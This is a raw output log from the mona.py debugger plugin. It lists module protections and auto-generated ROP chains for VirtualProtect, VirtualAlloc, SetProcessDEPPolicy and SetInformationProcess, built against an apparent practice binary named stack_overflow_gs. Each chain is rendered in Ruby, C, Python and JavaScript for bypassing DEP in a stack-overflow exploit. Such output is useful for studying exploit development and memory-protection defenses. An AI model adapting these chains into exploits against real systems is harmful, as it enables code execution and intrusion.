================================================================================
  Output generated by mona.py v2.0, rev 576 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : post2008server, release 6.2.9200
  Process being debugged : stack_overflow_gs (pid 3964)
  Current mona arguments: rop -m kernel32.dll,ntdll,msvcr120d.dll
================================================================================
  2018-07-16 14:18:42
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x751e0000 | 0x752b7000 | 0x000d7000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll)
 0x777c0000 | 0x7792f000 | 0x0016f000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x75300000 | 0x75440000 | 0x00140000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL)
 0x00400000 | 0x00419000 | 0x00019000 | False  | False   | False |  False   | False  | -1.0- [stack_overflow_gs.exe] (D:\Documents and Settings\Desktop\Debug\stack_overflow_gs.exe)
 0x70c20000 | 0x70ddf000 | 0x001bf000 | True   | True    | False |  False   | False  | 12.00.21005.1builtby:REL [MSVCR120D.dll] (D:\Documents and Settings\Desktop\Debug\MSVCR120D.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x75377191,  # POP EAX # RETN [KERNEL32.DLL] 
      0x70dce1a0,  # ptr to &VirtualProtect() [IAT MSVCR120D.dll]
      0x7535e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x70d524d4,  # LEA ESI,EAX # RETN [MSVCR120D.dll] 
      0x70cc813f,  # POP EBP # RETN [MSVCR120D.dll] 
      0x778a1c73,  # & call esp [ntdll.dll]
      0x7533c17b,  # POP EBX # RETN [KERNEL32.DLL] 
      0x00000201,  # 0x00000201-> ebx
      0x70da1073,  # POP EDX # RETN [MSVCR120D.dll] 
      0x00000040,  # 0x00000040-> edx
      0x7533cbcd,  # POP ECX # RETN [KERNEL32.DLL] 
      0x70dc8015,  # &Writable location [MSVCR120D.dll]
      0x70cb3e87,  # POP EDI # RETN [MSVCR120D.dll] 
      0x75360003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x70ce6321,  # POP EAX # RETN [MSVCR120D.dll] 
      0x90909090,  # nop
      0x70c4beb4,  # PUSHAD # RETN [MSVCR120D.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x75377191,  // POP EAX // RETN [KERNEL32.DLL] 
      0x70dce1a0,  // ptr to &VirtualProtect() [IAT MSVCR120D.dll]
      0x7535e737,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] 
      0x70d524d4,  // LEA ESI,EAX // RETN [MSVCR120D.dll] 
      0x70cc813f,  // POP EBP // RETN [MSVCR120D.dll] 
      0x778a1c73,  // & call esp [ntdll.dll]
      0x7533c17b,  // POP EBX // RETN [KERNEL32.DLL] 
      0x00000201,  // 0x00000201-> ebx
      0x70da1073,  // POP EDX // RETN [MSVCR120D.dll] 
      0x00000040,  // 0x00000040-> edx
      0x7533cbcd,  // POP ECX // RETN [KERNEL32.DLL] 
      0x70dc8015,  // &Writable location [MSVCR120D.dll]
      0x70cb3e87,  // POP EDI // RETN [MSVCR120D.dll] 
      0x75360003,  // RETN (ROP NOP) [KERNEL32.DLL]
      0x70ce6321,  // POP EAX // RETN [MSVCR120D.dll] 
      0x90909090,  // nop
      0x70c4beb4,  // PUSHAD // RETN [MSVCR120D.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x75377191,  # POP EAX # RETN [KERNEL32.DLL] 
      0x70dce1a0,  # ptr to &VirtualProtect() [IAT MSVCR120D.dll]
      0x7535e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x70d524d4,  # LEA ESI,EAX # RETN [MSVCR120D.dll] 
      0x70cc813f,  # POP EBP # RETN [MSVCR120D.dll] 
      0x778a1c73,  # & call esp [ntdll.dll]
      0x7533c17b,  # POP EBX # RETN [KERNEL32.DLL] 
      0x00000201,  # 0x00000201-> ebx
      0x70da1073,  # POP EDX # RETN [MSVCR120D.dll] 
      0x00000040,  # 0x00000040-> edx
      0x7533cbcd,  # POP ECX # RETN [KERNEL32.DLL] 
      0x70dc8015,  # &Writable location [MSVCR120D.dll]
      0x70cb3e87,  # POP EDI # RETN [MSVCR120D.dll] 
      0x75360003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x70ce6321,  # POP EAX # RETN [MSVCR120D.dll] 
      0x90909090,  # nop
      0x70c4beb4,  # PUSHAD # RETN [MSVCR120D.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u7191%u7537" + // 0x75377191 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%ue1a0%u70dc" + // 0x70dce1a0 : ,# ptr to &VirtualProtect() [IAT MSVCR120D.dll]
    "%ue737%u7535" + // 0x7535e737 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
    "%u24d4%u70d5" + // 0x70d524d4 : ,# LEA ESI,EAX # RETN [MSVCR120D.dll] 
    "%u813f%u70cc" + // 0x70cc813f : ,# POP EBP # RETN [MSVCR120D.dll] 
    "%u1c73%u778a" + // 0x778a1c73 : ,# & call esp [ntdll.dll]
    "%uc17b%u7533" + // 0x7533c17b : ,# POP EBX # RETN [KERNEL32.DLL] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u1073%u70da" + // 0x70da1073 : ,# POP EDX # RETN [MSVCR120D.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%ucbcd%u7533" + // 0x7533cbcd : ,# POP ECX # RETN [KERNEL32.DLL] 
    "%u8015%u70dc" + // 0x70dc8015 : ,# &Writable location [MSVCR120D.dll]
    "%u3e87%u70cb" + // 0x70cb3e87 : ,# POP EDI # RETN [MSVCR120D.dll] 
    "%u0003%u7536" + // 0x75360003 : ,# RETN (ROP NOP) [KERNEL32.DLL]
    "%u6321%u70ce" + // 0x70ce6321 : ,# POP EAX # RETN [MSVCR120D.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%ubeb4%u70c4" + // 0x70c4beb4 : ,# PUSHAD # RETN [MSVCR120D.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x7532af02,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75380fb8,  # ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
      0x777e713c,  # POP EDX # RETN [ntdll.dll] 
      0x00000022,  # 0x00000022-> edx
      0x70c5382d,  # POP ECX # RETN [MSVCR120D.dll] 
      0x777c0221,  # &0x00000002 [ntdll.dll]
      0x777e6429,  # POP EBX # RETN [ntdll.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      0x75328537,  # POP EAX # RETN [KERNEL32.DLL] 
      0x00000004,  # 0x00000004-> eax
      0x70cb3697,  # POP EDI # RETN [MSVCR120D.dll] 
      0x70cb3697,  # skip 4 bytes [MSVCR120D.dll]
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x7532af02,  // POP EAX // RETN [KERNEL32.DLL] 
      0x75380fb8,  // ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [ntdll.dll] 
      0x777e713c,  // POP EDX // RETN [ntdll.dll] 
      0x00000022,  // 0x00000022-> edx
      0x70c5382d,  // POP ECX // RETN [MSVCR120D.dll] 
      0x777c0221,  // &0x00000002 [ntdll.dll]
      0x777e6429,  // POP EBX // RETN [ntdll.dll] 
      0xffffffff,  // 0xffffffff-> ebx
      0x75328537,  // POP EAX // RETN [KERNEL32.DLL] 
      0x00000004,  // 0x00000004-> eax
      0x70cb3697,  // POP EDI // RETN [MSVCR120D.dll] 
      0x70cb3697,  // skip 4 bytes [MSVCR120D.dll]
      0x777ecd5c,  // PUSHAD // RETN [ntdll.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x7532af02,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75380fb8,  # ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
      0x777e713c,  # POP EDX # RETN [ntdll.dll] 
      0x00000022,  # 0x00000022-> edx
      0x70c5382d,  # POP ECX # RETN [MSVCR120D.dll] 
      0x777c0221,  # &0x00000002 [ntdll.dll]
      0x777e6429,  # POP EBX # RETN [ntdll.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      0x75328537,  # POP EAX # RETN [KERNEL32.DLL] 
      0x00000004,  # 0x00000004-> eax
      0x70cb3697,  # POP EDI # RETN [MSVCR120D.dll] 
      0x70cb3697,  # skip 4 bytes [MSVCR120D.dll]
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%uaf02%u7532" + // 0x7532af02 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u0fb8%u7538" + // 0x75380fb8 : ,# ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
    "%u1ac0%u7785" + // 0x77851ac0 : ,# MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
    "%u713c%u777e" + // 0x777e713c : ,# POP EDX # RETN [ntdll.dll] 
    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
    "%u382d%u70c5" + // 0x70c5382d : ,# POP ECX # RETN [MSVCR120D.dll] 
    "%u0221%u777c" + // 0x777c0221 : ,# &0x00000002 [ntdll.dll]
    "%u6429%u777e" + // 0x777e6429 : ,# POP EBX # RETN [ntdll.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "%u8537%u7532" + // 0x75328537 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
    "%u3697%u70cb" + // 0x70cb3697 : ,# POP EDI # RETN [MSVCR120D.dll] 
    "%u3697%u70cb" + // 0x70cb3697 : ,# skip 4 bytes [MSVCR120D.dll]
    "%ucd5c%u777e" + // 0x777ecd5c : ,# PUSHAD # RETN [ntdll.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x778598a4,  # POP EBP # RETN [ntdll.dll] 
      0x75325620,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      0x77839ed1,  # POP EBX # RETN [ntdll.dll] 
      0x778bf198,  # &0x00000000 [ntdll.dll]
      0x70ce4b96,  # POP EDI # RETN [MSVCR120D.dll] 
      0x70ce4b96,  # skip 4 bytes [MSVCR120D.dll]
      0x7784faa1,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x778598a4,  // POP EBP // RETN [ntdll.dll] 
      0x75325620,  // SetProcessDEPPolicy() [KERNEL32.DLL]
      0x77839ed1,  // POP EBX // RETN [ntdll.dll] 
      0x778bf198,  // &0x00000000 [ntdll.dll]
      0x70ce4b96,  // POP EDI // RETN [MSVCR120D.dll] 
      0x70ce4b96,  // skip 4 bytes [MSVCR120D.dll]
      0x7784faa1,  // PUSHAD // RETN [ntdll.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x778598a4,  # POP EBP # RETN [ntdll.dll] 
      0x75325620,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      0x77839ed1,  # POP EBX # RETN [ntdll.dll] 
      0x778bf198,  # &0x00000000 [ntdll.dll]
      0x70ce4b96,  # POP EDI # RETN [MSVCR120D.dll] 
      0x70ce4b96,  # skip 4 bytes [MSVCR120D.dll]
      0x7784faa1,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u98a4%u7785" + // 0x778598a4 : ,# POP EBP # RETN [ntdll.dll] 
    "%u5620%u7532" + // 0x75325620 : ,# SetProcessDEPPolicy() [KERNEL32.DLL]
    "%u9ed1%u7783" + // 0x77839ed1 : ,# POP EBX # RETN [ntdll.dll] 
    "%uf198%u778b" + // 0x778bf198 : ,# &0x00000000 [ntdll.dll]
    "%u4b96%u70ce" + // 0x70ce4b96 : ,# POP EDI # RETN [MSVCR120D.dll] 
    "%u4b96%u70ce" + // 0x70ce4b96 : ,# skip 4 bytes [MSVCR120D.dll]
    "%ufaa1%u7784" + // 0x7784faa1 : ,# PUSHAD # RETN [ntdll.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x70d8021b,  # POP EAX # RETN [MSVCR120D.dll] 
      0x70dce198,  # ptr to &VirtualAlloc() [IAT MSVCR120D.dll]
      0x7535e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x70d524d4,  # LEA ESI,EAX # RETN [MSVCR120D.dll] 
      0x7782c882,  # POP EBP # RETN [ntdll.dll] 
      0x778a1c73,  # & call esp [ntdll.dll]
      0x77819d0e,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x77800d1d,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x778832cb,  # POP ECX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x70cb44a8,  # POP EDI # RETN [MSVCR120D.dll] 
      0x75360003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x7536fcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x90909090,  # nop
      0x777eb7c8,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x70d8021b,  // POP EAX // RETN [MSVCR120D.dll] 
      0x70dce198,  // ptr to &VirtualAlloc() [IAT MSVCR120D.dll]
      0x7535e737,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] 
      0x70d524d4,  // LEA ESI,EAX // RETN [MSVCR120D.dll] 
      0x7782c882,  // POP EBP // RETN [ntdll.dll] 
      0x778a1c73,  // & call esp [ntdll.dll]
      0x77819d0e,  // POP EBX // RETN [ntdll.dll] 
      0x00000001,  // 0x00000001-> ebx
      0x77800d1d,  // POP EDX // RETN [ntdll.dll] 
      0x00001000,  // 0x00001000-> edx
      0x778832cb,  // POP ECX // RETN [ntdll.dll] 
      0x00000040,  // 0x00000040-> ecx
      0x70cb44a8,  // POP EDI // RETN [MSVCR120D.dll] 
      0x75360003,  // RETN (ROP NOP) [KERNEL32.DLL]
      0x7536fcd8,  // POP EAX // RETN [KERNEL32.DLL] 
      0x90909090,  // nop
      0x777eb7c8,  // PUSHAD // RETN [ntdll.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x70d8021b,  # POP EAX # RETN [MSVCR120D.dll] 
      0x70dce198,  # ptr to &VirtualAlloc() [IAT MSVCR120D.dll]
      0x7535e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x70d524d4,  # LEA ESI,EAX # RETN [MSVCR120D.dll] 
      0x7782c882,  # POP EBP # RETN [ntdll.dll] 
      0x778a1c73,  # & call esp [ntdll.dll]
      0x77819d0e,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x77800d1d,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x778832cb,  # POP ECX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x70cb44a8,  # POP EDI # RETN [MSVCR120D.dll] 
      0x75360003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x7536fcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x90909090,  # nop
      0x777eb7c8,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u021b%u70d8" + // 0x70d8021b : ,# POP EAX # RETN [MSVCR120D.dll] 
    "%ue198%u70dc" + // 0x70dce198 : ,# ptr to &VirtualAlloc() [IAT MSVCR120D.dll]
    "%ue737%u7535" + // 0x7535e737 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
    "%u24d4%u70d5" + // 0x70d524d4 : ,# LEA ESI,EAX # RETN [MSVCR120D.dll] 
    "%uc882%u7782" + // 0x7782c882 : ,# POP EBP # RETN [ntdll.dll] 
    "%u1c73%u778a" + // 0x778a1c73 : ,# & call esp [ntdll.dll]
    "%u9d0e%u7781" + // 0x77819d0e : ,# POP EBX # RETN [ntdll.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%u0d1d%u7780" + // 0x77800d1d : ,# POP EDX # RETN [ntdll.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%u32cb%u7788" + // 0x778832cb : ,# POP ECX # RETN [ntdll.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u44a8%u70cb" + // 0x70cb44a8 : ,# POP EDI # RETN [MSVCR120D.dll] 
    "%u0003%u7536" + // 0x75360003 : ,# RETN (ROP NOP) [KERNEL32.DLL]
    "%ufcd8%u7536" + // 0x7536fcd8 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%ub7c8%u777e" + // 0x777eb7c8 : ,# PUSHAD # RETN [ntdll.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

